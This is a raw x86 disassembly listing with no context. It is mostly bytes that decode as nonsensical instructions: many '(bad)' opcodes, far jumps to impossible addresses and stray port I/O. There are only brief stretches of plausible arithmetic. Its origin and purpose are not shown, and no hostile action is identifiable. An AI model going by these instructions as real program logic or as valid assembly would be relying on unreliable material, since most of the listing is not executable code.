  406dbe:	sbb    BYTE PTR [eax],bl
  406dc0:	and    BYTE PTR [ebx],cl
  406dc2:	dec    esp
  406dc3:	daa    
  406dc4:	xchg   ebx,eax
  406dc5:	and    eax,0x8452159c
  406dca:	lea    esp,[edi-0x5b]
  406dcd:	sub    DWORD PTR [edi],ebp
  406dcf:	call   0x21ba:0x5d22f86a
  406dd6:	adc    al,0x20
  406dd8:	ret    0xeb77
  406ddb:	mov    ds:0x4e73476c,al
  406de0:	pop    esi
  406de1:	and    BYTE PTR [ecx-0x3c],0x2
  406de5:	mov    edi,0x22fbef2
  406dea:	jle    0x406e43
  406dec:	push   0x48da8e1f
  406df1:	loop   0x406d7a
  406df3:	sub    al,0x1c
  406df5:	cmp    edi,DWORD PTR [ebx-0x7b760f27]
  406dfb:	clc    
  406dfc:	push   esi
  406dfd:	clc    
  406dfe:	clc    
  406dff:	mov    ch,0x5f
  406e01:	mov    ebx,ds
  406e03:	and    DWORD PTR ds:[edi],edx
  406e06:	ins    BYTE PTR es:[edi],dx
  406e07:	imul   edx,DWORD PTR [ebp+0x57ffed29],0x9ac87d86
  406e11:	nop
  406e12:	jnp    0x406de1
  406e14:	dec    esi
  406e15:	xor    BYTE PTR [ecx-0x4c8a0a0d],cl
  406e1b:	and    eax,0xb0648947
  406e20:	(bad)  
  406e21:	fstp   QWORD PTR [edi]
  406e23:	out    0x9b,al
  406e25:	mov    ds:0x5dfb81e7,eax
  406e2a:	and    DWORD PTR ds:0x8aeae87,esi
  406e30:	xchg   edx,eax
  406e31:	adc    bh,BYTE PTR [edi]
  406e33:	shr    BYTE PTR [ebx],1
  406e35:	iret   
  406e36:	push   ebx
  406e37:	adc    al,0x93
  406e39:	test   eax,0xe72ca0c8
  406e3e:	sbb    DWORD PTR [edx-0x1fc194af],esp
  406e44:	cmp    BYTE PTR [ebp+0x70],ah
  406e47:	sbb    al,0x19
  406e49:	retf   0x5796
  406e4c:	push   esi
  406e4d:	inc    edx
  406e4e:	fimul  WORD PTR [ecx]
  406e50:	xchg   BYTE PTR [ebx+0x14],ch
  406e53:	adc    bh,BYTE PTR [ebp-0x15acddb2]
  406e59:	add    BYTE PTR [ebx+edi*2+0x3c009ec5],0x97
  406e61:	push   es
  406e62:	adc    DWORD PTR ds:0xb8d956fb,esi
  406e68:	push   ss
  406e69:	mov    esi,0xe6106927
  406e6e:	dec    esi
  406e6f:	cwde   
  406e70:	inc    edi
  406e71:	mov    al,0xfe
  406e73:	xchg   esp,eax
  406e74:	mov    ds:0x89e95fe2,al
  406e79:	shl    DWORD PTR [eax+0x39],1
  406e7c:	xchg   ebx,eax
  406e7d:	cdq    
  406e7e:	shl    BYTE PTR [edi],1
  406e80:	pop    edi
  406e81:	mov    ?,WORD PTR [edx-0x73e39325]
  406e87:	mov    ds:0xd218a387,eax
  406e8c:	jmp    0x4f6aebe2
  406e91:	and    al,0xd2
  406e93:	xchg   ecx,eax
  406e94:	inc    edi
  406e95:	mov    esi,0x93841d27
  406e9a:	mov    ecx,ss
  406e9c:	je     0x406e85
  406e9e:	pop    ss
  406e9f:	pop    edi
  406ea0:	mov    edi,0xa3b31007
  406ea5:	les    ebx,FWORD PTR ds:0xc7694bc
  406eab:	out    0x1b,eax
  406ead:	cmp    ebp,edx
  406eaf:	sahf   
  406eb0:	(bad)  
  406eb1:	xchg   ecx,eax
  406eb2:	xchg   ebp,eax
  406eb3:	sub    ebp,DWORD PTR [edx-0x2d]
  406eb6:	jno    0x406e40
  406eb8:	test   al,0xed
  406eba:	loope  0x406e97
  406ebc:	leave  
  406ebd:	mov    eax,0x32b8866d
  406ec2:	mov    ebx,0x20b4910a
  406ec7:	pop    es
  406ec8:	dec    eax
  406ec9:	and    al,0x74
  406ecb:	test   BYTE PTR [edi+0x61],dh
  406ece:	ins    DWORD PTR es:[edi],dx
  406ecf:	xchg   BYTE PTR [esi],cl
  406ed1:	xchg   edx,eax
  406ed2:	(bad)  
  406ed3:	iret   
  406ed4:	cmp    eax,0xef8edad3
  406ed9:	clc    
  406eda:	cmp    esi,DWORD PTR [edx]
  406edc:	mov    edx,0xf7ead562
  406ee1:	and    al,0xbe
  406ee3:	loop   0x406e80
  406ee5:	jnp    0x406f14
  406ee7:	mov    bh,BYTE PTR [ecx-0x46]
  406eea:	mov    al,0x49
  406eec:	pop    ds
  406eed:	and    BYTE PTR [edi],bl
  406eef:	addr16 adc eax,0xd14f3cee
  406ef5:	cmp    al,0x75
  406ef7:	mov    WORD PTR [ebp+ebp*1-0xd],es
  406efb:	test   BYTE PTR [edi],0x27
  406efe:	fs in  eax,dx
  406f00:	dec    ebp
  406f01:	popf   
  406f02:	sub    al,0x8a
  406f04:	xchg   ebp,eax
  406f05:	xor    BYTE PTR [ecx+0x6],bl
  406f08:	popa   
  406f09:	fs inc ebp
  406f0b:	mov    dl,0x36
  406f0d:	push   eax
  406f0e:	mov    eax,ds:0x5015d2b1
  406f13:	jne    0x406f32
  406f15:	pusha  
  406f16:	cwde   
  406f17:	mov    eax,ds:0x423f4916
  406f1c:	out    dx,eax
  406f1d:	inc    edi
  406f1e:	adc    ecx,DWORD PTR [ebx+0x788d3455]
  406f24:	push   ds
  406f25:	(bad)  
  406f26:	loopne 0x406f87
  406f28:	nop
  406f29:	mov    bl,0xcd
  406f2b:	xchg   ebx,eax
  406f2c:	cs test al,0xbd
  406f2f:	fild   QWORD PTR [edi]
  406f31:	adc    DWORD PTR [edx*2+0x69ce664c],edx
  406f38:	nop
  406f39:	lods   al,BYTE PTR ds:[esi]
  406f3a:	retf   
  406f3b:	dec    edi
  406f3c:	cmp    DWORD PTR [ebx+esi*1-0x73],0x8
  406f41:	pusha  
  406f42:	cmp    eax,DWORD PTR [esi-0x10]
  406f45:	in     eax,0xf5
  406f47:	stos   BYTE PTR es:[edi],al
  406f48:	jo     0x406fc7
  406f4a:	sbb    DWORD PTR [esp+edx*2],ebx
  406f4d:	enter  0x686f,0x26
  406f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f52:	test   al,0x1d
  406f54:	imul   ecx,DWORD PTR [ecx],0x31e072cb
  406f5a:	jge    0x406ee4
  406f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f5d:	in     eax,dx
  406f5e:	push   edi
  406f5f:	cld    
  406f60:	sub    DWORD PTR [eax-0x4a3d17bb],eax
  406f66:	inc    edx
  406f67:	xor    edx,DWORD PTR fs:[ecx+ecx*2]
  406f6b:	daa    
  406f6c:	shr    DWORD PTR [esi],0xb2
  406f6f:	cmp    bx,WORD PTR [edx]
  406f72:	fs das 
  406f74:	shl    DWORD PTR [ebp-0x5c],1
  406f77:	fisttp DWORD PTR [esi]
  406f79:	(bad)  
  406f7b:	and    bl,BYTE PTR [ebp-0x2e2a10c7]
  406f81:	sbb    ebx,edx
  406f83:	pushf  
  406f84:	mov    edi,0x9de11409
  406f89:	jl     0x406ff5
  406f8b:	pop    esp
  406f8c:	xchg   edi,eax
  406f8d:	stc    
  406f8e:	ds (bad) 
  406f90:	cmp    ebp,DWORD PTR [eax]
  406f92:	(bad)
  406f96:	pusha  
  406f97:	jne    0x406f66
  406f99:	push   ds
  406f9a:	mov    esi,0xf48019c
  406f9f:	xlat   BYTE PTR ds:[ebx]
  406fa0:	stc    
  406fa1:	xchg   edi,eax
  406fa2:	pusha  
  406fa3:	call   0xf414:0xb86dd37c
  406faa:	pop    es
  406fab:	pusha  
  406fac:	sahf   
  406fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fae:	aaa    
  406faf:	jbe    0x40702c
  406fb1:	int3   
  406fb2:	jbe    0x406fca
  406fb4:	outs   dx,BYTE PTR ds:[esi]
  406fb5:	arpl   WORD PTR [esi-0x68],sp
  406fb8:	mov    ds:0xd609dbea,eax
  406fbd:	imul   edi,DWORD PTR [ebp+0xc],0xffffffc1
  406fc1:	sahf   
  406fc2:	push   0x11
  406fc4:	aam    0xe
  406fc6:	xlat   BYTE PTR ds:[ebx]
  406fc7:	push   ebx
  406fc8:	sti    
  406fc9:	stc    
  406fca:	jmp    0x3fc2c566
  406fcf:	sub    esi,DWORD PTR [edx-0x758fdd83]
  406fd5:	pop    edx
  406fd6:	dec    esi
  406fd7:	fbld   TBYTE PTR [ecx]
  406fd9:	(bad)  
  406fda:	bound  ecx,QWORD PTR [ecx+ebx*1]
  406fdd:	mov    DWORD PTR ss:[ecx],edx
  406fe0:	or     ebx,DWORD PTR [eax+0x52]
  406fe3:	imul   ebx,DWORD PTR [ebx+eax*1],0xa81a32e4
  406fea:	ret    
  406feb:	je     0x407031
  406fed:	push   ds
  406fee:	ins    DWORD PTR es:[edi],dx
  406fef:	pop    ecx
  406ff0:	enter  0x6861,0xc9
  406ff4:	cli    
  406ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ff6:	hlt    
  406ff7:	loop   0x406fe1
  406ff9:	xor    ah,BYTE PTR [esi*8-0x1177d66d]
  407000:	test   DWORD PTR [eax+0xf4c7b41],eax
  407006:	adc    ebx,DWORD PTR [edx-0x3a]
  407009:	iret   
  40700a:	dec    ebp
  40700b:	push   edx
  40700c:	fisttp QWORD PTR [ecx+0x6a]
  40700f:	ret    
  407010:	stos   BYTE PTR es:[edi],al
  407011:	cmp    DWORD PTR [ecx],edx
  407013:	mov    dl,0xff
  407015:	sti    
  407016:	jmp    0xd22f27db
  40701b:	adc    eax,0x600c9640
  407020:	lea    esp,[esi]
  407022:	mov    bh,0x83
  407024:	frstor [ebp-0x5bd4a33d]
  40702a:	jmp    0x9aae1fb3
  40702f:	push   edx
  407030:	dec    esp
  407031:	loopne 0x406fd2
  407033:	int    0xea
  407035:	(bad)  
  407036:	cmp    BYTE PTR [ebx-0x53],cl
  407039:	push   ds
  40703a:	mov    ecx,0xcc045729
  40703f:	call   0x481a12f5
  407044:	mov    esp,0xcc00580e
  407049:	adc    BYTE PTR [esi+0x2da40e71],dh
  40704f:	call   0x7cf3906d
  407054:	xor    bl,BYTE PTR [ebx-0x30614014]
  40705a:	push   cs
  40705b:	cli    
  40705c:	fstp   DWORD PTR gs:[ecx]
  40705f:	fbld   TBYTE PTR [eax+0x81564b8]
  407065:	mov    ds:0xe4810bf7,al
  40706a:	dec    edx
  40706b:	(bad)  
  40706c:	mov    ah,0x44
  40706e:	jmp    0x5751b7ef
  407073:	call   0x7aa6:0x31942069
  40707a:	push   cs
  40707b:	add    bh,BYTE PTR [eax+0x1]
  40707e:	das    
  40707f:	xchg   esp,eax
  407080:	lahf   
  407081:	fist   DWORD PTR [edi-0x25f19d78]
  407087:	mov    ds:0x5bcf4dd6,eax
  40708c:	cmp    esi,DWORD PTR [edi+edx*4-0x56f18ff0]
  407093:	aaa    
  407094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407095:	jbe    0x407081
  407097:	fisttp WORD PTR [edi+0x12]
  40709a:	mov    esp,0x59dabf70
  40709f:	add    edx,DWORD PTR [esi+0xf]
  4070a2:	push   esi
  4070a3:	ret    
  4070a4:	lock fs adc esi,ecx
  4070a8:	or     al,ah
  4070aa:	pop    ss
  4070ab:	loop   0x407115
  4070ad:	fbld   TBYTE PTR [edx+0x2cf1a8ab]
  4070b3:	pop    ebp
  4070b4:	jge    0x4070cc
  4070b6:	mov    dl,0x72
  4070b8:	es sub dh,bl
  4070bb:	xchg   BYTE PTR [edx-0x13],dh
  4070be:	adc    al,0x12
  4070c0:	sahf   
  4070c1:	lods   eax,DWORD PTR ds:[esi]
  4070c2:	dec    esp
  4070c3:	mov    ch,0x19
  4070c5:	dec    ebp
  4070c6:	ret    
  4070c7:	call   0xc7ab3f4a
  4070cc:	ret    0x718
  4070cf:	shl    DWORD PTR [ecx+0x5fb9277],cl
  4070d5:	jge    0x40710b
  4070d7:	pop    ds
  4070d8:	cmp    DWORD PTR [ebp-0x364961f0],esp
  4070de:	in     al,dx
  4070df:	int3   
  4070e0:	dec    edx
  4070e1:	jne    0x4070ff
  4070e3:	pop    esi
  4070e4:	in     eax,dx
  4070e5:	pop    esi
  4070e6:	fisubr WORD PTR [esi]
  4070e8:	jmp    0x407164
  4070ea:	mov    al,0x5f
  4070ec:	push   0xffffffbe
  4070ee:	jne    0x4070ab
  4070f0:	test   DWORD PTR ds:0x8ce3c0ae,0x9aed2d0f
  4070fa:	jmp    0x1274:0x6ff0381c
  407101:	outs   dx,DWORD PTR ds:[esi]
  407102:	or     eax,0xe51bd50f
  407107:	aas    
  407108:	push   ebx
  407109:	mov    ch,0xc1
  40710b:	ins    DWORD PTR es:[edi],dx
  40710c:	ss aam 0xb3
  40710f:	je     0x4070ca
  407111:	pop    ebp
  407112:	out    0x5f,al
  407114:	xor    edx,DWORD PTR [ebp+ebx*2+0x32]
  407118:	mov    bl,BYTE PTR [ebp-0x7854a811]
  40711e:	test   DWORD PTR [ebp+0x141a555f],0x92bbae30
  407128:	mov    bh,0x6f
  40712a:	adc    BYTE PTR [ebp+0x15],ah
  40712d:	retf   0xf21d
  407130:	sub    ch,bl
  407132:	inc    esp
  407133:	aam    0x32
  407135:	push   esp
  407136:	dec    ebp
  407137:	push   edi
  407138:	mov    ebx,DWORD PTR [eax+0x25]
  40713b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40713c:	test   eax,0x89d331c7
  407141:	into   
  407142:	gs popf 
  407144:	push   esp
  407145:	leave  
  407146:	rcr    BYTE PTR [esi+eax*4-0x1c],0x44
  40714b:	fiadd  WORD PTR [edx+0x6285dca9]
  407151:	mov    bh,0x1e
  407153:	cwde   
  407154:	fidiv  DWORD PTR [eax-0x40]
  407157:	jle    0x40717e
  407159:	mov    edx,0xb986aec8
  40715e:	ret    0x9d2d
  407161:	fstenv [ebp+0x65e3bf1b]
  407168:	imul   eax,DWORD PTR [edi+0x62],0x7e
  40716c:	dec    ebp
  40716d:	inc    ecx
  40716e:	cmp    BYTE PTR [esi],al
  407170:	ss cmp al,0xfa
  407173:	div    BYTE PTR [eax-0xf]
  407176:	cld    
  407177:	cmp    DWORD PTR [ebx+0x53],ebx
  40717a:	jno    0x40717f
  40717c:	pushf  
  40717d:	sub    BYTE PTR [ecx],0xbc
  407180:	repz mov ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c5:	adc    BYTE PTR ds:0x188590be,ch
  4071cb:	sbb    BYTE PTR [esi-0x6ee7e7ee],bl
  4071d1:	std    
  4071d2:	pop    esp
  4071d3:	not    BYTE PTR [eax]
  4071d5:	and    ch,BYTE PTR ds:0xd26a17c7
  4071db:	fld    DWORD PTR [ecx]
  4071dd:	loop   0x40725d
  4071df:	push   esi
  4071e0:	pop    edx
  4071e1:	mov    esi,0x6ed6f007
  4071e6:	imul   ebx,eax,0x980107f
  4071ec:	sub    esp,ecx
  4071ee:	sub    DWORD PTR [esi-0x18],esp
  4071f1:	hlt    
  4071f2:	cwde   
  4071f3:	dec    ebx
  4071f4:	repnz adc eax,0x81b008b8
  4071fb:	jo     0x4071b6
  4071fd:	jbe    0x4071ab
  4071ff:	popa   
  407200:	push   cs
  407201:	dec    eax
  407202:	test   ch,0xc2
  407205:	and    BYTE PTR [ecx-0x4c],bh
  407208:	rol    DWORD PTR [eax-0xdfcaa07],0xc9
  40720f:	sbb    BYTE PTR [edx+edx*8],bh
  407212:	push   edx
  407213:	jmp    0x4071c2
  407215:	loope  0x40722d
  407217:	or     BYTE PTR [edi+0x66767e6b],0xa7
  40721e:	xor    al,0x77
  407220:	mov    al,0xf3
  407222:	jno    0x40720e
  407224:	jle    0x4071d6
  407226:	sub    dh,al
  407228:	test   eax,0x58529dfd
  40722d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40722e:	aad    0x7f
  407230:	jbe    0x407212
  407232:	mov    fs:0xa210c1f5,al
  407238:	scas   eax,DWORD PTR es:[edi]
  407239:	je     0x407215
  40723b:	cmp    BYTE PTR [ecx],0xd3
  40723e:	sahf   
  40723f:	pop    esp
  407240:	xor    eax,0xc8e067dc
  407245:	cmp    ah,dh
  407247:	(bad)  
  407248:	rcr    ah,0xd3
  40724b:	xchg   ebp,eax
  40724c:	add    eax,DWORD PTR fs:0xe45af81b
  407253:	mov    esp,DWORD PTR [eax-0x9]
  407256:	add    esi,DWORD PTR [ecx]
  407258:	stos   BYTE PTR es:[edi],al
  407259:	mov    ebx,gs
  40725b:	dec    ebp
  40725c:	iret   
  40725d:	push   0x4ab31244
  407262:	jmp    0x40720c
  407264:	push   ss
  407265:	jmp    0x32e61867
  40726a:	inc    eax
  40726b:	es jge 0x40721c
  40726e:	cs jecxz 0x4071fc
  407271:	outs   dx,BYTE PTR ds:[esi]
  407272:	ins    BYTE PTR es:[edi],dx
  407273:	xlat   BYTE PTR ds:[ebx]
  407274:	ror    ah,cl
  407276:	outs   dx,DWORD PTR ds:[esi]
  407277:	adc    BYTE PTR [ebx],ah
  407279:	jge    0x40729d
  40727b:	xchg   edi,eax
  40727c:	inc    ecx
  40727d:	push   eax
  40727e:	pop    ebx
  40727f:	jmp    FWORD PTR [edi+0x59]
  407282:	mov    al,0x7d
  407284:	mov    ecx,0x3ef81ee3
  407289:	mov    edi,0xd001ceaa
  40728e:	mov    DWORD PTR ds:0xcbd26681,ebx
  407294:	mov    esp,0x29bf59ca
  407299:	and    al,0x72
  40729b:	jnp    0x407276
  40729d:	and    ah,dh
  40729f:	cmp    eax,0xd4e9d1de
  4072a4:	loopne 0x40724f
  4072a6:	ds inc edx
  4072a8:	pop    ecx
  4072a9:	hlt    
  4072aa:	dec    eax
  4072ab:	ins    BYTE PTR es:[edi],dx
  4072ac:	add    ebx,eax
  4072ae:	stos   BYTE PTR es:[edi],al
  4072af:	push   0x2abc2066
  4072b4:	push   ebp
  4072b5:	add    eax,0x4c533dc9
  4072ba:	leave  
  4072bb:	fs mov cl,0xce
  4072be:	(bad)  
  4072bf:	pop    esp
  4072c0:	add    DWORD PTR [esi-0x6b67c28d],edx
  4072c6:	jg     0x40724a
  4072c8:	mov    ch,0x6e
  4072ca:	mov    ebp,0x6bb852a7
  4072cf:	push   esi
  4072d0:	(bad)  
  4072d1:	mov    esp,0x8e169c40
  4072d6:	and    eax,0x8eb15d9
  4072db:	call   0xe35e2229
  4072e0:	push   edi
  4072e1:	sub    ch,BYTE PTR [esi]
  4072e3:	mov    al,ds:0xb79d246a
  4072e8:	stos   BYTE PTR es:[edi],al
  4072e9:	xor    eax,0xa8bc85fe
  4072ee:	in     eax,0x2f
  4072f0:	scas   eax,DWORD PTR es:[edi]
  4072f1:	das    
  4072f2:	jns    0x4072cc
  4072f4:	mov    eax,ds:0x87698e1c
  4072f9:	xchg   esi,eax
  4072fa:	dec    ebx
  4072fb:	call   0xa8146806
  407300:	outs   dx,BYTE PTR ds:[esi]
  407301:	int3   
  407302:	jno    0x4072ab
  407304:	xchg   ebp,eax
  407305:	jp     0x40730d
  407307:	pop    edx
  407308:	sub    bl,bl
  40730a:	scas   al,BYTE PTR es:[edi]
  40730b:	pusha  
  40730c:	xor    DWORD PTR [ebx],ecx
  40730e:	inc    esp
  40730f:	lds    ecx,FWORD PTR fs:[ebx-0x3b]
  407313:	fwait
  407314:	stos   BYTE PTR es:[edi],al
  407315:	enter  0xa881,0x98
  407319:	ror    BYTE PTR [edx+esi*1-0x4fe77d06],0x85
  407321:	stc    
  407322:	in     al,dx
  407323:	hlt    
  407324:	les    esp,FWORD PTR [eax-0x400bb735]
  40732a:	push   0x75
  40732c:	or     al,0xe0
  40732e:	mov    ds,esp
  407330:	ins    DWORD PTR es:[edi],dx
  407331:	inc    ebx
  407332:	push   0xffffffaa
  407334:	shl    BYTE PTR [ebp-0x5d],0xd
  407338:	into   
  407339:	mov    ah,0xd9
  40733b:	enter  0x367a,0xf2
  40733f:	pop    edx
  407340:	outs   dx,DWORD PTR ds:[esi]
  407341:	xor    dl,BYTE PTR [ebx]
  407343:	xchg   DWORD PTR [esi+0x191fae6c],esi
  407349:	dec    ebp
  40734a:	mov    ecx,0x9bfa7f32
  40734f:	pop    esi
  407350:	rcr    DWORD PTR ds:0xaf9ccdbc,0x70
  407357:	push   edx
  407358:	neg    BYTE PTR [edi+0x703c93de]
  40735e:	arpl   WORD PTR [ecx-0x2ef51959],dx
  407364:	push   edx
  407365:	xchg   ebx,eax
  407366:	push   edi
  407367:	out    dx,al
  407368:	xor    eax,0x2cf1fc3f
  40736d:	inc    edi
  40736e:	int    0xc5
  407370:	pushf  
  407371:	mov    dl,BYTE PTR [edx+esi*8]
  407374:	mov    al,ds:0xa408882a
  407379:	inc    ebp
  40737a:	or     al,0xa5
  40737c:	cmc    
  40737d:	bound  esp,QWORD PTR [esi]
  40737f:	in     al,dx
  407380:	repnz inc ecx
  407382:	loop   0x407389
  407384:	or     DWORD PTR [ebx],0xffffff9f
  407387:	in     eax,dx
  407388:	daa    
  407389:	arpl   WORD PTR [ecx],bp
  40738b:	stos   BYTE PTR es:[edi],al
  40738c:	int3   
  40738d:	mov    edi,DWORD PTR [ebp+0x5fa68191]
  407393:	jbe    0x407339
  407395:	adc    edi,ecx
  407397:	xor    BYTE PTR [edx-0x49],cl
  40739a:	sub    al,0x66
  40739c:	mov    edi,0xcdfd96b9
  4073a1:	jne    0x4073b0
  4073a3:	adc    eax,0x12e71012
  4073a8:	mov    ds,WORD PTR [ecx-0x73]
  4073ab:	loopne 0x4073a0
  4073ad:	mov    edi,DWORD PTR [ebp-0x16]
  4073b0:	sti    
  4073b1:	adc    ebx,ebx
  4073b3:	popf   
  4073b4:	sbb    al,0x5f
  4073b6:	push   eax
  4073b7:	les    ebp,FWORD PTR [eax]
  4073b9:	stc    
  4073ba:	and    al,BYTE PTR [edi+0x19c3bd9c]
  4073c0:	add    BYTE PTR [ecx-0x36495b09],bl
  4073c6:	cmp    BYTE PTR [ecx-0x621370e7],dl
  4073cc:	mov    eax,0x616abf34
  4073d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073d2:	adc    BYTE PTR [ebx+0x3c4908e4],dl
  4073d8:	int    0x9e
  4073da:	call   DWORD PTR [esi-0x7e]
  4073dd:	fst    DWORD PTR [eax]
  4073df:	push   cs
  4073e0:	aam    0x72
  4073e2:	shr    DWORD PTR [edi+0x47622597],0xf
  4073e9:	lea    esp,[ecx-0x6c451337]
  4073ef:	mov    dh,BYTE PTR [eax]
  4073f1:	xor    dl,BYTE PTR [ebx+0x52694c63]
  4073f7:	adc    bh,0x78
  4073fa:	pusha  
  4073fb:	test   eax,0x246c06ba
  407400:	cmp    DWORD PTR [edi-0x2fbc4a75],esp
  407406:	xchg   DWORD PTR [edx],ebx
  407408:	pop    esp
  407409:	adc    BYTE PTR [eax-0x58],dl
  40740c:	mov    eax,0x963c865
  407411:	pop    ebx
  407412:	mov    ah,BYTE PTR [ebx-0x56b57f9c]
  407418:	int    0x4a
  40741a:	push   ebp
  40741b:	aaa    
  40741c:	sbb    BYTE PTR [eax+0x379f59e5],0x2b
  407423:	add    eax,0xe8621c8a
  407428:	sub    eax,0xf8d66f2c
  40742d:	pop    edx
  40742e:	test   eax,0xb33d8def
  407433:	test   BYTE PTR [ecx-0x2cc66d2b],al
  407439:	sbb    DWORD PTR [esi],eax
  40743b:	mov    cl,0xd7
  40743d:	xor    eax,0xc4e1dcda
  407442:	pop    ebx
  407443:	fstp   QWORD PTR [edi+eax*2-0x6f8db4b3]
  40744a:	mov    bh,0x91
  40744c:	shl    BYTE PTR ds:0xf39cd630,cl
  407452:	loope  0x407429
  407454:	jecxz  0x407418
  407456:	sbb    al,0xe8
  407458:	mov    bh,0xa9
  40745a:	(bad)  
  40745b:	jne    0x4074ca
  40745d:	sub    DWORD PTR [esi+0x2a],ebp
  407460:	je     0x40746c
  407462:	ja     0x4074a8
  407464:	jmp    0x4074aa
  407466:	jle    0x40741a
  407468:	cs test al,0x49
  40746b:	ss out 0x81,eax
  40746e:	push   eax
  40746f:	int    0x2f
  407471:	sti    
  407472:	(bad)  [edi-0x6b]
  407475:	ja     0x4074af
  407477:	push   0x59
  407479:	push   edx
  40747a:	or     dl,BYTE PTR [edx-0x19a2eae3]
  407480:	and    edx,eax
  407482:	loop   0x407438
  407484:	jnp    0x40746e
  407486:	cld    
  407487:	push   ds
  407488:	and    eax,DWORD PTR gs:[eax]
  40748b:	xor    ebp,DWORD PTR [esi+0x31]
  40748e:	mov    ebx,ss
  407490:	and    eax,0xa6c56f38
  407495:	and    ch,BYTE PTR [edx-0x22]
  407498:	mov    eax,ds:0xe5584054
  40749d:	xlat   BYTE PTR ds:[ebx]
  40749e:	push   edx
  40749f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074a0:	cmp    ebp,DWORD PTR [eax+esi*1-0x76]
  4074a4:	das    
  4074a5:	xchg   BYTE PTR [edx+ebx*1],al
  4074a8:	xchg   BYTE PTR [edx-0x3d],al
  4074ab:	call   FWORD PTR [edi-0x4a58ea27]
  4074b1:	mov    edx,0xfee9590d
  4074b6:	sub    BYTE PTR [esi],bh
  4074b8:	jbe    0x40743f
  4074ba:	mov    eax,ds:0x4d7ad8a3
  4074bf:	add    BYTE PTR [ebx-0x1],0x66
  4074c3:	cmp    al,0xa0
  4074c5:	in     eax,0x6f
  4074c7:	adc    BYTE PTR [ecx+0x12],0x36
  4074cb:	push   ss
  4074cc:	(bad)  
  4074cd:	pop    eax
  4074ce:	and    edi,esi
  4074d0:	xchg   esi,eax
  4074d1:	lock adc ch,BYTE PTR [edi+0x70]
  4074d5:	dec    ecx
  4074d6:	jp     0x407519
  4074d8:	push   es
  4074d9:	mov    edi,0x99685bf7
  4074de:	xchg   ebp,eax
  4074df:	sub    eax,0x63ab788a
  4074e4:	data16 adc BYTE PTR [esi-0x72533f33],al
  4074eb:	mov    eax,ds:0x2a4a660a
  4074f0:	xor    al,BYTE PTR [esi]
  4074f2:	and    al,0x55
  4074f4:	adc    al,0x27
  4074f6:	xchg   BYTE PTR [esi+0x64840f91],cl
  4074fc:	dec    esi
  4074fd:	dec    edx
  4074fe:	in     eax,dx
  4074ff:	adc    eax,0x907e4f0a
  407504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407505:	or     al,0x26
  407507:	push   edi
  407508:	push   esp
  407509:	out    0x8,al
  40750b:	and    edi,esp
  40750d:	cwde   
  40750e:	add    edi,DWORD PTR [ecx-0x33]
  407511:	xchg   edi,eax
  407512:	mov    edi,0xf41d09bc
  407518:	ret    
  407519:	push   edi
  40751a:	pop    ebp
  40751b:	inc    ecx
  40751c:	jae    0x407588
  40751e:	inc    eax
  40751f:	loop   0x407500
  407521:	mov    bh,0x7
  407523:	cmp    eax,0x23a0cf62
  407528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407529:	ds jle 0x40751c
  40752c:	inc    ebp
  40752d:	ins    DWORD PTR es:[edi],dx
  40752e:	das    
  40752f:	cmp    bh,ch
  407531:	cld    
  407532:	jl     0x4074fc
  407534:	add    BYTE PTR [ebx+0x59],0x11
  407538:	cmc    
  407539:	mov    ebp,0x5c99b5e8
  40753e:	test   BYTE PTR [esi+eax*2-0x10],0x1f
  407543:	mov    bh,0xe
  407545:	pop    esi
  407546:	or     eax,0x5a31324
  40754b:	xor    BYTE PTR [edi-0x74e2e1dd],ch
  407551:	xchg   DWORD PTR [eax-0x14],ebx
  407554:	cmp    al,0x31
  407556:	repnz mov ecx,eax
  407559:	cmp    al,0x1c
  40755b:	mov    bh,0x7f
  40755d:	sbb    ch,BYTE PTR [ebx-0x532fc978]
  407563:	lds    ecx,FWORD PTR ds:[edi-0x875e9c4]
  40756a:	retf   0x621d
  40756d:	mov    edx,ds
  40756f:	jmp    0x40750c
  407571:	pop    ecx
  407572:	test   ebx,ecx
  407574:	cwde   
  407575:	push   edx
  407576:	fwait
  407577:	xor    ebx,DWORD PTR ds:0x625e14e7
  40757d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757e:	mov    al,dh
  407580:	push   cs
  407581:	and    DWORD PTR [esp+ecx*8],esp
  407584:	jmp    0xd63686fa
  407589:	add    al,0xb9
  40758b:	sub    ch,dl
  40758d:	mov    ds:0x8b093da6,eax
  407592:	dec    ebp
  407593:	mov    ah,0xf
  407595:	lods   al,BYTE PTR ds:[esi]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
